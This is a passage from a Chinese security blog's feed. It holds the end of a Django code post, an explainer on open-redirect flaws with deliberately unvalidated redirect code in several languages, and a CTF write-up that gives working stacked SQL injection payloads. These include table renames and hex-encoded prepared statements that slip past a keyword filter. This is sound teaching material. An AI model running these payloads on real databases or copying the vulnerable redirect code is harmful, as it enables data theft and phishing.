%&#125;"</span>; &#125;</span><br><span class="line">                          toastr.success(data.msg);</span><br><span class="line">                      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data.status == <span class="string">'fail'</span>) &#123;</span><br><span class="line">                          toastr.error(data.msg);</span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;);</span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>几个坑点 ，这里前端传值传array时会在json中自动加上[]</p><p>所以在后端接收时记得用getlist(list[])</p><p>manytomanyfiled的字段用create来创建，add添加内容<br>后端代码：<br>forms.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AddGroupForm</span><span class="params">(forms.Form)</span>:</span></span><br><span class="line">    name = forms.CharField(max_length=<span class="number">20</span>, required=<span class="keyword">True</span>)</span><br><span class="line">    group_members = forms.ModelMultipleChoiceField(queryset=Linkman.objects.all())</span><br></pre></td></tr></table></figure></p><p>views.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AddGroup</span><span class="params">(LoginRequiredMixin, View)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        add_group = AddGroupForm(request.POST)</span><br><span class="line">        <span class="keyword">if</span> add_group != <span class="string">''</span>:</span><br><span class="line">            <span class="keyword">if</span> Group.objects.filter(name=request.POST.get(<span class="string">'name'</span>)):</span><br><span class="line">                <span class="keyword">return</span> HttpResponse(<span class="string">'&#123;"status":"fail", "msg":"分组已存在！"&#125;'</span>, content_type=<span class="string">'application/json'</span>)</span><br><span class="line">            group = Group.objects.create(name=request.POST.get(<span class="string">'name'</span>))</span><br><span class="line">            members = request.POST.getlist(<span class="string">'members[]'</span>)</span><br><span class="line">            num = len(members)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">                group.group_members.add(members[i])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> HttpResponse(<span class="string">'&#123;"status":"success", "msg":"添加成功！"&#125;'</span>, content_type=<span class="string">'application/json'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">'&#123;"status":"fail", "msg":"内容不符合要求！"&#125;'</span>, content_type=<span class="string">'application/json'</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;记几个坑和常用的代码段&lt;/p&gt;
&lt;h2 id=&quot;AdminLTE的侧边栏问题&quot;&gt;&lt;a href=&quot;#AdminLTE的侧边栏问题&quot; clas
      
    
    </summary>
    
    
      <category term="Django" scheme="https://www.twosmi1e.com/tags/Django/"/>
    
      <category term="安全开发" scheme="https://www.twosmi1e.com/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>url跳转漏洞</title>
    <link href="https://www.twosmi1e.com/2019/12/25/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.twosmi1e.com/2019/12/25/url跳转漏洞/</id>
    <published>2019-12-25T14:46:39.000Z</published>
    <updated>2019-12-28T16:26:12.647Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概念及危害"><a href="#概念及危害" class="headerlink" title="概念及危害"></a>概念及危害</h2><p>现在web应用越来越多的需要和其他第三方应用交互，以及在自身应用内部根据不同的逻辑引向不同的页面。例如一个典型的场景就是：web站点可以使用第三方账号（如qq,微博等）进行登录，在登录时就会发生跳转，如果在这个过程中没有做好安全策略就会产生安全漏洞。例如可以利用恶意的URL跳转进行钓鱼等。</p><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><ol><li>恶意用户借助URL跳转构造钓鱼页面欺骗其他用户，以及获取敏感信息等，在有在线业务的站点危害较大。</li><li>借助URL跳转突破一些基于白名单的安全机制。如：传统的IM对URL的传播进行安全校验，但对于大站点的域名及URL直接允许通过并显示可信的URL，如果该URL中包含恶意跳转可能会导致安全限制被绕过。</li><li>基于白名单引用的资源，这种方式与上面的类似。比如：引入youku.com的视频，白名单中检测的时youku.com,如果包含恶意链接还是可能突破限制。</li><li>在带referer传输的站点中，就不只会产生任意URL跳转这个问题，同时可能会造成所有基于referer的安全策略失效（比较少见）</li></ol><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>web站点或者第三方的服务端没有对用户输入的参数进行合法性校验，或者校验不严格，在URL跳转时用户可控，导致恶意参数的传入以及执行，将应用程序引导到恶意的第三方区域产生的安全问题（短链接更加难以防范）。</p><h3 id="详细原因"><a href="#详细原因" class="headerlink" title="详细原因"></a>详细原因</h3><ul><li>写代码时没有考虑过任意URL跳转漏洞，或者根本不知道/不认为这是个漏洞</li><li>写代码时考虑不周,用取子串、取后缀等方法简单判断，代码逻辑可被绕过</li><li>对传入参数做一些奇葩的操作(域名剪切/拼接/重组)和判断，适得其反，反被绕过</li><li>原始语言自带的解析URL、判断域名的函数库出现逻辑漏洞或者意外特性,可被绕过</li><li>原始语言、服务器/容器特性、浏览器等对标准URL协议解析处理等差异性导致被绕过</li></ul><h3 id="常见漏洞点"><a href="#常见漏洞点" class="headerlink" title="常见漏洞点"></a>常见漏洞点</h3><ul><li>用户登录、统一身份认证处、认证以后发生跳转</li><li>用户分享、收藏内容后会发生跳转</li><li>跨站点认证、在授权后会认证</li><li>站内对其他网站的链接，点击后会跳转</li></ul><h2 id="跳转方式"><a href="#跳转方式" class="headerlink" title="跳转方式"></a>跳转方式</h2><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="通过META标签"><a href="#通过META标签" class="headerlink" title="通过META标签"></a>通过META标签</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">"url"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $url = $_REQUEST[<span class="string">"url"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $url = <span class="string">"url_meta.php"</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Refresh"</span> content=<span class="string">"5; url=&lt;?php echo $url?&gt;"</span> /&gt; </span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/12/25/url跳转漏洞/1573699043210.png" alt="Alt text"></p><h4 id="通过JavaScript"><a href="#通过JavaScript" class="headerlink" title="通过JavaScript"></a>通过JavaScript</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">$target = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href=\"$target\"&lt;/script&gt;"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Please input the URL"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/12/25/url跳转漏洞/1573699281408.png" alt="Alt text"></p><h4 id="通过header"><a href="#通过header" class="headerlink" title="通过header"></a>通过header</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">$target = $_GET[<span class="string">'url'</span>];</span><br><span class="line">header(<span class="string">"Location: $target"</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Please input the URL"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果jump参数没有任何限制，用户就可以构造恶意链接进行提交造成恶意URL跳转 <a href="http://www.xxxx.com/aaa.php?url=http://www.eval.com" target="_blank" rel="external">http://www.xxxx.com/aaa.php?url=http://www.eval.com</a> ，通过恶意链接造成不可信的第三方跳转可以进一步钓鱼等(直接跳转)。</p><p>同时由于一些网站的安全策略，白名单中有<a href="http://www.xxxx.com/aaa.php" target="_blank" rel="external">http://www.xxxx.com/aaa.php</a> 而导致一些安全策略被绕过，导致用户最终访问的时恶意链接。（过滤不严格的白名单）</p><h3 id="常见的发生URL跳转的参数名"><a href="#常见的发生URL跳转的参数名" class="headerlink" title="常见的发生URL跳转的参数名"></a>常见的发生URL跳转的参数名</h3><table><thead><tr><th>参数</th></tr></thead><tbody><tr><td>redirect</td></tr><tr><td>redirect_to</td></tr><tr><td>redirect_url</td></tr><tr><td>url</td></tr><tr><td>jump</td></tr><tr><td>jump_to</td></tr><tr><td>target</td></tr><tr><td>to</td></tr><tr><td>link</td></tr><tr><td>linkto</td></tr><tr><td>domain</td></tr></tbody></table><h3 id="常见的URL跳转代码"><a href="#常见的URL跳转代码" class="headerlink" title="常见的URL跳转代码"></a>常见的URL跳转代码</h3><ul><li>java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.sendRedirect(request.getParameter(<span class="string">"url"</span>));</span><br></pre></td></tr></table></figure><ul><li>PHP</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$redirect_url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">header(<span class="string">"Location: "</span> . $redirect_url);</span><br></pre></td></tr></table></figure><ul><li>.NET</li></ul><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> redirect_url = request.QueryString[<span class="string">"url"</span>];</span><br><span class="line">Response.Redirect(redirect_url);</span><br></pre></td></tr></table></figure><ul><li>Django</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redirect_url = request.GET.get(<span class="string">"url"</span>)</span><br><span class="line">HttpResponseRedirect(redirect_url)</span><br></pre></td></tr></table></figure><ul><li>Flask</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redirect_url = request.form[&apos;url&apos;]</span><br><span class="line">redirect(redirect_url)</span><br></pre></td></tr></table></figure><h3 id="白名单限制"><a href="#白名单限制" class="headerlink" title="白名单限制"></a>白名单限制</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// $allowedDomains 表示允许跳转的url白名单</span></span><br><span class="line">$allowedDomains = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"aaaa.com"</span></span><br><span class="line">        <span class="string">"bbbb.com"</span></span><br><span class="line">        .......</span><br><span class="line">    );</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encodeUrl</span><span class="params">($urlInfo)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        $path = <span class="keyword">isset</span>($urlInfo[<span class="string">'path'</span>]) ? $urlInfo[<span class="string">'path'</span>] : <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($path))</span><br><span class="line">        &#123;</span><br><span class="line">            $t = explode(<span class="string">"/"</span>, $path);</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($t); $i++)</span><br><span class="line">            &#123;</span><br><span class="line">                $t[$i] = rawurlencode($t[$i]);             </span><br><span class="line">            &#125;</span><br><span class="line">            $path = implode(<span class="string">"/"</span>, $t);</span><br><span class="line">        &#125;</span><br><span class="line">        $query = <span class="keyword">isset</span>($urlInfo[<span class="string">'query'</span>]) ? $urlInfo[<span class="string">'query'</span>] : <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($query))</span><br><span class="line">        &#123;</span><br><span class="line">            $t = explode(<span class="string">"&amp;"</span>, $query);</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($t); $i++)</span><br><span class="line">            &#123;</span><br><span class="line">                $tt = explode(<span class="string">"="</span>, $t[$i]);</span><br><span class="line">                $tt[<span class="number">1</span>] = rawurlencode($tt[<span class="number">1</span>]);</span><br><span class="line">                $t[$i] = implode(<span class="string">"="</span>, $tt);            </span><br><span class="line">            &#125;</span><br><span class="line">            $query = implode(<span class="string">"&amp;"</span>, $t);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($urlInfo[<span class="string">'host'</span>]) || <span class="keyword">empty</span>($urlInfo[<span class="string">'host'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> $path. <span class="string">"?"</span>. $query;</span><br><span class="line">        &#125;</span><br><span class="line">        $scheme = <span class="keyword">isset</span>($urlInfo[<span class="string">'scheme'</span>]) ? $urlInfo[<span class="string">'scheme'</span>] : <span class="string">'http'</span>;</span><br><span class="line">        $port = <span class="keyword">isset</span>($urlInfo[<span class="string">'port'</span>]) ? $urlInfo[<span class="string">'port'</span>] : <span class="number">80</span>;</span><br><span class="line"> </span><br><span class="line">         </span><br><span class="line">        $request = $scheme . <span class="string">'://'</span>. $urlInfo[<span class="string">'host'</span>];</span><br><span class="line">        $request .= ($port == <span class="number">80</span>) ? <span class="string">''</span> : <span class="string">':'</span>.$port;</span><br><span class="line">        $request .= $path;</span><br><span class="line">        $request .= (<span class="keyword">empty</span>($query)) ? <span class="string">''</span> : <span class="string">'?'</span>.$query;</span><br><span class="line">        <span class="keyword">return</span> $request;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkUrl</span><span class="params">($url,$domainArr=array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        $res = <span class="keyword">array</span>(<span class="string">'isTrustedDomain'</span> =&gt; <span class="keyword">false</span>,<span class="string">'url'</span> =&gt; <span class="string">''</span>,<span class="string">'domain'</span> =&gt; <span class="string">''</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($url))     <span class="keyword">return</span> $res;</span><br><span class="line">        $domainArr = <span class="keyword">empty</span>($domainArr) || !is_array($domainArr) ? $allowedDomains : $domainArr;</span><br><span class="line">        $url      = filterUrl($url);<span class="comment">//先过滤特殊字符</span></span><br><span class="line">        $p      = parse_url($url);</span><br><span class="line">        $scheme = $p[<span class="string">'scheme'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!in_array(strtolower($scheme),<span class="keyword">array</span>(<span class="string">'http'</span>,<span class="string">'https'</span>)))&#123;</span><br><span class="line">            <span class="keyword">return</span> $res;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        $host   = $p[<span class="string">'host'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!isValidHost($host))&#123;</span><br><span class="line">            <span class="keyword">return</span> $res;</span><br><span class="line">        &#125;</span><br><span class="line">        $hostLen = strlen($host);</span><br><span class="line">        <span class="keyword">foreach</span>($domainArr <span class="keyword">as</span> $domain)&#123;</span><br><span class="line">            $firstPos = strpos($host, $domain);</span><br><span class="line">            <span class="keyword">if</span>($firstPos !== <span class="keyword">false</span> &amp;&amp; ($firstPos + strlen($domain)) == $hostLen)&#123;</span><br><span class="line">                 </span><br><span class="line">                <span class="keyword">if</span>($firstPos == <span class="number">0</span> || $domain[<span class="number">0</span>] == <span class="string">'.'</span> || $host[$firstPos<span class="number">-1</span>] == <span class="string">'.'</span>)&#123;</span><br><span class="line">                    $res[<span class="string">'isTrustedDomain'</span>] = <span class="keyword">true</span>;</span><br><span class="line">                    $res[<span class="string">'url'</span>]                         = $url;</span><br><span class="line">                    $res[<span class="string">'domain'</span>]              = $domain;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterUrl</span><span class="params">( $url )</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($url)) <span class="keyword">return</span> $url;</span><br><span class="line">        <span class="comment">// Strip all of the Javascript in script tags out...</span></span><br><span class="line">        $url = preg_replace(<span class="string">'/&lt;SCRIPT.*?&lt;\/SCRIPT&gt;/ims'</span>,<span class="string">""</span>,$url);</span><br><span class="line">        <span class="comment">// Strip all blank character</span></span><br><span class="line">        $url = preg_replace(<span class="string">'/[\s\v\0]+/'</span>,<span class="string">""</span>,$url);</span><br><span class="line">        <span class="comment">//Strip special characters(',",&lt;,&gt;,\)</span></span><br><span class="line">        $url = str_replace(<span class="keyword">array</span>(<span class="string">"'"</span>,<span class="string">"\""</span>,<span class="string">"&lt;"</span>,<span class="string">"&gt;"</span>,<span class="string">"\\"</span>),<span class="string">''</span>,$url);</span><br><span class="line">        <span class="keyword">return</span> $url;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidHost</span><span class="params">($host)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        $p = <span class="string">"/^[0-9a-zA-Z\-\.]+$/"</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_match($p,$host) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line">     </span><br><span class="line">$url = <span class="string">"https://www.baidu.com"</span>;</span><br><span class="line">$call_back_url = trim($url);</span><br><span class="line">$call_back_url = encodeUrl(parse_url(urldecode($call_back_url)));</span><br><span class="line">$res = checkUrl($call_back_url, $domainArr);</span><br><span class="line"> </span><br><span class="line">var_dump($res);</span><br></pre></td></tr></table></figure><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><ol><li>referer限制<br>确定传递URL参数的引入来源，保证URL的有效性，避免恶意用户自己生成的链接(这里要注意的是，在有些特殊的环境下，URL跳转会带着HTTP referer头，这样就会使得依赖referer头验证的方式失效)</li><li>进行token验证<br>保证所有的链接是可信域中的，加入用户不可控的token在服务端进行验证，防止恶意跳转</li><li>服务端做好域名白名单或跳转白名单，只对合法的URL进行跳转（常用）</li><li>对请求参数做加密和签名，防止参数被篡改，服务端要能合法正确的解析URL（不常用，多应用在跳转的URL是由后台生产，不是用户在前台输入）</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概念及危害&quot;&gt;&lt;a href=&quot;#概念及危害&quot; class=&quot;headerlink&quot; title=&quot;概念及危害&quot;&gt;&lt;/a&gt;概念及危害&lt;/h2&gt;&lt;p&gt;现在web应用越来越多的需要和其他第三方应用交互，以及在自身应用内部根据不同的逻辑引向不同的页面。例如一个典型的场景
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://www.twosmi1e.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>堆叠注入</title>
    <link href="https://www.twosmi1e.com/2019/12/25/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    <id>https://www.twosmi1e.com/2019/12/25/堆叠注入/</id>
    <published>2019-12-25T14:43:23.000Z</published>
    <updated>2019-12-25T15:03:10.071Z</updated>
    
    <content type="html"><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p> Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked  injection。</p><h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><p>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用<code>mysqli_multi_query()</code>函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是<code>mysqli_ query()</code>函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p><h2 id="强网杯2019-随便注"><a href="#强网杯2019-随便注" class="headerlink" title="强网杯2019 随便注"></a>强网杯2019 随便注</h2><p><img src="/2019/12/25/堆叠注入/1574410683306.png" alt="Alt text"></p><p>过滤了<br><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p><p>尝试堆叠注入<br><code>/?inject=222&#39;;show databases;#</code><br><img src="/2019/12/25/堆叠注入/1574407751475.png" alt="Alt text"><br><code>/?inject=222&#39;;use ctftraining;show tables;#</code><br><img src="/2019/12/25/堆叠注入/1574407847082.png" alt="Alt text"><br>禁用了select，使用show columns from</p><p><code>1&#39;;use ctftraining;show columns from FLAG_TABLE;#</code><br><img src="/2019/12/25/堆叠注入/1574408083206.png" alt="Alt text"><br>假的 继续找<br><code>1&#39;;use supersqli;show tables;#</code><br><img src="/2019/12/25/堆叠注入/1574408211803.png" alt="Alt text"></p><p>?inject=1’;use supersqli;show columns from words;#<br><img src="/2019/12/25/堆叠注入/1574408631356.png" alt="Alt text"></p><p>?inject=1’; use supersqli; show columns from <code>1919810931114514</code>;#<br><img src="/2019/12/25/堆叠注入/1574408613541.png" alt="Alt text"></p><p>然后这里有个巧妙的解法，因为关键字禁了很多，想取出数据不容易<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</span><br></pre></td></tr></table></figure></p><p>words是我们默认查询的表，重命名为words1，把flag所在表重命名为words，然后再用<br>1’ or 1=1#就可以看到flag了。</p><p><img src="/2019/12/25/堆叠注入/1574409043990.png" alt="Alt text"></p><p>还有一个思路就是<br><code>set @t=0x73656c65637420312c323b;prepare x from @t;execute x;</code><br>用16进制来绕过关键词检测         <code>select 1,2;</code><br><img src="/2019/12/25/堆叠注入/1574409627251.png" alt="Alt text"><br>这里strstr检测子串，可以用大小写绕过。<br><img src="/2019/12/25/堆叠注入/1574409769925.png" alt="Alt text"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select flag from 1919810931114514</span><br><span class="line">1&apos;;Set @t=0x73656c65637420666c61672066726f6d2031393139383130393331313134353134;Prepare x from @t;Execute x;#</span><br><span class="line"></span><br><span class="line">select * from 1919810931114514</span><br><span class="line">1&apos;;Set @t=0x73656c656374202a2066726f6d2031393139383130393331313134353134;Prepare x from @t;Execute x;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from supersqli.1919810931114514</span><br><span class="line">1&apos;;Set @t=0x73656c656374202a2066726f6d20737570657273716c692e31393139383130393331313134353134;Prepare x from @t;Execute x;#</span><br></pre></td></tr></table></figure><p><img src="/2019/12/25/堆叠注入/1574410446902.png" alt="Alt text"><br>done</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;定义&quot;&gt;&lt;a href=&quot;#定义&quot; class=&quot;headerlink&quot; title=&quot;定义&quot;&gt;&lt;/a&gt;定义&lt;/h2&gt;&lt;p&gt; Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://www.twosmi1e.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="SQL注入" scheme="https://www.twosmi1e.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Django的默认用户认证系统</title>
    <link href="https://www.twosmi1e.com/2019/12/25/Django%E7%9A%84%E9%BB%98%E8%AE%A4%E7%94%A8%E6%88%B7%E8%AE%A4%E8%AF%81%E7%B3%BB%E7%BB%9F/"/>
